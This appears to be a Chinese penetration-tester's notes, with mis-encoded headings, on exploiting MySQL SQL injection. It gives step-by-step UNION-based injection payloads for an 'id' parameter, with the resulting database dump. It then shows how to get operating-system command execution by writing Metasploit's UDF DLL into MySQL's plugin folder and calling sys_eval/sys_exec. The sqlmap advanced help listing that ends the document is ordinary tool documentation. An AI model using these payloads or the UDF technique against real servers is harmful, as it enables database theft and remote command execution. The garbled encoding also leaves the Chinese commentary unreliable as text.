# æ‰‹å·¥åˆ©ç”¨ç¬¬0æ­¥ ğŸŒ¹ç¡®è®¤SQLiæ˜¯å¦å­˜åœ¨

# idå‚æ•°çš„å€¼ä¸º
1234' ORDER BY 10-- mucA

# ä½¿ç”¨äºŒåˆ†æ³• æ ¹æ®Responseé•¿åº¦ã€å†…å®¹çš„ä¸åŒ é€æ­¥ç¡®å®šäº†UNIONå…±å¯æŸ¥16ä¸ªå­—æ®µ

-----

# æ‰‹å·¥åˆ©ç”¨ç¬¬1æ­¥ ğŸŒ¹ä¾æ¬¡æµ‹è¯•æ¯ä¸ªå­—æ®µ çœ‹å“ªä¸ªå­—æ®µä¼šå›æ˜¾åˆ°Response

# idå‚æ•°çš„å€¼ä¸º
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626b7171,(CASE WHEN (17=17) THEN 1 ELSE 0 END),0x716b717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ziys

# è§‚å¯ŸResponse body
# å‘ç°Response bodyä¸­æœ‰å­—ç¬¦ä¸² qbkqq1qbkqq

# æ ¼å¼ä¸º [å‰ç¼€][æ•°æ®][åç¼€]
# [å‰ç¼€]å’Œ[åç¼€]çš„ä½œç”¨æ˜¯æ–¹ä¾¿åŒ¹é…åˆ°è·å–åˆ°çš„[æ•°æ®]
# è¿™é‡Œå‰ç¼€å’Œåç¼€éƒ½æ˜¯qbkqq  [æ•°æ®]å³
1
# æ‰€ä»¥ ç¬¬9ä¸ªå­—æ®µå¯ä»¥å›æ˜¾åˆ°Response

-----

# æ‰‹å·¥åˆ©ç”¨ç¬¬2æ­¥ ğŸŒ¹å†æ¬¡ç¡®è®¤ åœ¨ä½¿ç”¨MySQLçš„CONCATå‡½æ•°çš„æƒ…å†µä¸‹ è¯¥å­—æ®µæ˜¯å¦ä»ä¼šå›æ˜¾åˆ°Response

# idå‚æ•°çš„å€¼ä¸º
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,0x6151484a717561715a4f44725a75456a45,0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CkJc

# Type: UNION query
# Title: Generic UNION query (NULL) - 16 columns
# ç¡®è®¤ åœ¨ä½¿ç”¨MySQLçš„CONCATå‡½æ•°çš„æƒ…å†µä¸‹ è¯¥å­—æ®µä»ä¼šå›æ˜¾åˆ°Response

-----

# æ‰‹å·¥åˆ©ç”¨ç¬¬3æ­¥ ğŸŒ¹è·å–æ•°æ® å¦‚è·å–æ‰€æœ‰æ•°æ®åº“çš„åç§°

# idå‚æ•°çš„å€¼ä¸º
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,IFNULL(CAST(schema_name AS NCHAR),0x20),0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- MzIj

# è§‚å¯ŸResponse body
# å‘ç°Response bodyä¸­æœ‰å­—ç¬¦ä¸²
<td>qbqjqinformation_schemaqbvjq</td>
<td>qbqjqmysqlqbvjq</td>
<td>qbqjqperformance_schemaqbvjq</td>

# æ ¼å¼ä¸º [å‰ç¼€][æ•°æ®][åç¼€]
# [å‰ç¼€]å’Œ[åç¼€]çš„ä½œç”¨æ˜¯æ–¹ä¾¿åŒ¹é…åˆ°è·å–åˆ°çš„[æ•°æ®]
# è¿™é‡Œå‰ç¼€å’Œåç¼€éƒ½æ˜¯qbqjq  [æ•°æ®]å³
information_schema
mysql
performance_schema
```

### åˆ©ç”¨MySQLæ•°æ®åº“çš„UDFå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤


* å‰ææ¡ä»¶
  * MySQLå…·å¤‡æ–‡ä»¶è¯»å–ã€å†™å…¥æƒé™
  * çŸ¥é“MySQLçš„pluginæ–‡ä»¶å¤¹çš„å…·ä½“ä½ç½®
* åŸç†æ˜¯ï¼Ÿ
  * MySQLçš„UDFå‡½æ•° - ä¸Šä¼ 1ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶:å…±äº«åº“(shared library)åˆ°å¯¹åº”æ–‡ä»¶å¤¹ï¼Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹å†…åŒ…å«2ä¸ªç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°(user-defined functions,UDF)ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°,ä½œç”¨éƒ½æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤. ç„¶ååœ¨æ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ åˆ›å»ºè¯¥å‡½æ•°, å¹¶ä½¿ç”¨selectè°ƒç”¨è¯¥å‡½æ•° å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤!


è‡ªåŠ¨è¿‡ç¨‹:
```
--os-shell
```


æ‰‹å·¥è¿‡ç¨‹:


ğŸŒ¹ç¬¬1æ­¥ - å‡†å¤‡UDFæ–‡ä»¶
```
metasploitä¸­æœ‰windowsä¸‹MySQLçš„UDFäºŒè¿›åˆ¶æ–‡ä»¶:
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
```

ğŸŒ¹ç¬¬2æ­¥ - ä¼ è¾“ UDFäºŒè¿›åˆ¶æ–‡ä»¶ çš„ æ•°æ® åˆ° ç›®æ ‡ä¸»æœº çš„ ç›®æ ‡æ–‡ä»¶å¤¹ /plugin/

å¯ä»¥è€ƒè™‘ç”¨hexç¼–ç ã€base64ç¼–ç .

```
MySQLå®ç°base64ç¼–ç è§£ç  MySQLç‰ˆæœ¬è¦æ±‚:ï¼ˆä¸»è¦æ˜¯çœ‹ç›®æ ‡æœºå™¨çš„mysqlèƒ½å¦ "è§£ç " ç¼–ç äº†çš„æ•°æ®.ï¼‰
MySQL >= 5.6.1
MariaDB >= 10.0.5 

// mysql sqlåœ¨è‡ªå·±pcå®ç°ç¼–ç 
select to_base64(load_file('D:\\lib_mysqludf_sys_64.dll')) into outfile "D:\\udf64.txt" 
```

```sql
// mysql sqlåœ¨å¯¹æ–¹serverä¸Šçš„mysqlå®ç° è§£ç !!!
select from_base64("base64çš„å†…å®¹") into dumpfile "D:\mysql-5.6.41-winx64\lib\plugin\udf64.dll";
```



ğŸŒ¹ç¬¬3æ­¥ - åˆ›å»ºudfå‡½æ•°

åˆ›å»º2ä¸ªå‡½æ•°:
```
sys_exec è¯¥å‡½æ•°æ— æ³•å›æ˜¾ç»“æœ
sys_eval å¯å›æ˜¾æ‰§è¡Œç»“æœ
create function sys_exec RETURNS int soname 'udf.dll';
create function sys_eval returns string soname 'udf.dll';


çœ‹ä¸‹å‡½æ•°æ˜¯å¦æˆåŠŸåˆ›å»º
mysql> select * from mysql.func where name = "sys_exec";
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_exec |   2 | udf.dll | function |
+----------+-----+---------+----------+
1 row in set (0.00 sec)
```



ğŸŒ¹ç¬¬4æ­¥ - æ‰§è¡Œå‡½æ•°

```
æ‰§è¡Œsys_evalå‡½æ•° è¯¥å‡½æ•°å¯å›æ˜¾æ‰§è¡Œç»“æœ
mysql> select sys_eval('whoami');
+------------------------+
| sys_eval('whoami')     |
+------------------------+
| desktop-s2l4c24\k0rz3n |
+------------------------+
1 row in set (0.27 sec)

æ‰§è¡Œsys_execå‡½æ•° è¯¥å‡½æ•°æ— æ³•å›æ˜¾ç»“æœ, ä¼šåœ¨ç›®æ ‡ä¸»æœºæ¡Œé¢ä¸Šå¼¹å‡ºé»‘æ¡†å¹¶ç«‹å³é€€å‡º!
mysql> select sys_exec('whoami');
+--------------------+
| sys_exec('whoami') |
+--------------------+
|                  0 |
+--------------------+
1 row in set (0.28 sec)
```


```
ğŸŒ¹ç¬¬5æ­¥ - åˆ é™¤2ä¸ªå‡½æ•°çš„å®šä¹‰

drop function sys_exec;
drop function sys_eval;
```


### Usage

```
âœ  sqlmap git:(master) âœ— python sqlmap.py -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.6.2#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: Python sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --mobile            Imitate smartphone through HTTP User-Agent header
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
    --ignore-proxy      Ignore system default proxy settings
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Regular requests between visits to a safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
    --force-ssl         Force usage of SSL/HTTPS
    --chunked           Use HTTP chunked transfer encoded (POST) requests
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
    --dbms=DBMS         Force back-end DBMS to provided value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to provided value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --smart             Perform thorough tests only if positive heuristic(s)
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-url=SEC..  Resulting page URL searched for second-order response
    --second-req=SEC..  Load second-order HTTP request from file

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Check for DBMS comments during enumeration
    --statements        Retrieve SQL statements being run on DBMS
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDE          DBMS database identifier(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First dump table entry to retrieve
    --stop=LIMITSTOP    Last dump table entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=SQLQ..  SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns
    --common-files      Check existence of common files

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=FILE..  Read a file from the back-end DBMS file system
    --file-write=FIL..  Write a local file on the back-end DBMS file system
    --file-dest=FILE..  Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
    --batch             Never ask for user input, use the default behavior
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --check-internet    Check Internet connection before assessing the target
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --har=HARFILE       Log all HTTP traffic into a HAR file
    --hex               Use hex conversion during data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --preprocess=PRE..  Use given script(s) for preprocessing of response data
    --repair            Redump entries having unknown character marker (?)
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp for filtering targets
    --skip-waf          Skip heuristic detection of WAF/IPS protection
    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")

  Miscellaneous:
    These options do not fit into any other category

    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --beep              Beep on question and/or when SQL injection is found
    --dependencies      Check for missing (optional) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --list-tampers      Display list of available tamper scripts
    --offline           Work in offline mode (only use session data)
    --purge             Safely remove all content from sqlmap data directory
    --results-file=R..  Location of CSV results file in multiple targets mode
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --unstable          Adjust options for unstable connections
    --update            Update sqlmap
    --wizard            Simple wizard interface for beginner users
```
